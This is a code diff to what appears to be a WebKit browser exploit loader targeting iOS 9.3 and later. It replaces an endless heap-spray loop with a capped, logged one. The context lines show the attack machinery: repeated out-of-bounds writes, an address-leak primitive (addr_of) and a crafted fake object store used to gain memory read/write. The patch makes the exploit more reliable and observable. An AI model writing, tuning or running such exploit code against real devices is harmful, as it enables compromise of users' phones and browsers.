@@ -261,7 +261,23 @@ wkloader.init = function() {
 		return output;
     }
 
-    while (1) {
+    /* ---- offline build: bounded, observable heap spray ----
+     * The original is `while (1)` with no cap and no feedback. Each round does
+     * oob_write_count out-of-bounds writes (200000 on iOS 9.3+), and the loop
+     * only exits once an object lands above 0xFFFFF. If the heap does not
+     * cooperate it spins forever and the page is stuck on "exploiting".
+     * Caps are generous: anything that would have succeeded still succeeds. */
+    var __spray = 0, __sprayOk = false;
+    var __sprayT0 = (new Date()).getTime();
+    var __sprayBudgetMs = 240000;
+    var __sprayRoundCap = 2000;
+    while (__spray < __sprayRoundCap) {
+        __spray++;
+        if ((__spray & 15) === 0) {
+            var __el = (new Date()).getTime() - __sprayT0;
+            wkloader.log("spray " + __spray + " rounds, " + (__el / 1000).toFixed(0) + "s, oob_write_count=" + offsets.oob_write_count);
+            if (__el > __sprayBudgetMs) { wkloader.log("spray: time budget exceeded, giving up"); break; }
+        }
         var array = {};
         array.p = 1.1;
         array[0] = 1.1; 
@@ -292,8 +308,13 @@ wkloader.init = function() {
         struct_leak.rw0_f4 = 1.1;
         
         fake_obj_store_addr = wkloader.addr_of(fake_obj_store);
-        if (fake_obj_store_addr > 0x000fffff) break;
+        if (fake_obj_store_addr > 0x000fffff) { __sprayOk = true; break; }
     }
+    if (!__sprayOk) {
+        wkloader.log("spray FAILED after " + __spray + " rounds");
+        return false;
+    }
+    wkloader.log("spray converged after " + __spray + " rounds");
 
     fake_obj_store.p1 = wkloader.u32_to_f64(0x11111111, 0x22222222); 
     fake_obj_store.p2 = wkloader.u32_to_f64(0x33333333, 0x44444444); 
